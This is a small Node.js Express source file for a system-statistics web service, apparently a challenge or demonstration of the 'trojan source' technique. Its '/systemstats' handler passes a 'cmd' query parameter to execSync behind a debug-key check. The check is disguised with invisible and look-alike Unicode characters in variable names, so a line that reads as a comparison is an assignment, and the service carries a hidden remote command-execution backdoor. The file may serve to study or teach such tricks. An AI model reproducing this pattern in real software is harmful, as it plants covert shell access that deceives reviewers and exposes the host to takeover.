const exec = require('child_process').execSync
const express = require('express')

const app = express()
const port = 3000

const secret = require('crypto').randomBytes(48).toString('hex')

const path = require('path');
app.use('/static', express.static(path.join(__dirname, 'static')));
app.get('/', async (req, res) => {
    ua = req.get('User-Agent')
    if (ua && ua.toLowerCase().includes('firefox'))
        res.sendFile(path.join(__dirname, 'index_firefox.html'));
    else
        res.sendFile(path.join(__dirname, 'index.html'));
})

app.get('/systemstats', async (req, res) => {
    let debug , output = ''
    //let output , debug = ''

    let { html , debugㅤ, cmd , cache } = req.query

    try {

        if ( debugㅤ) {
            if ( debugǃ=secret )
                output += `Incorrect debug key ${debugǃ}\n`
        }
        else
            cache = ( !cache || debug==secret ? false : true )

        output += await exec('vmstat; mpstat | tail -n+2; iostat -h | tail -n+2').toString()
        
        if ( cmd && debugㅤ== secret )
            output += await exec(cmd).toString()
        else if ( cmd )
            output += "Attack detected ! Your IP was logged."

        if (cache!=true) // Disable cache
            res.set('Cache-Control', 'no-cache')

        output = (html==undefined ? output : `<pre>${output}</pre>`)
        res.send(output)
    } catch(e) {
        res.status(500)
        res.send('An error has occured.')
    }
});

console.log(` Listening on port ${port}...`)
app.listen(port)
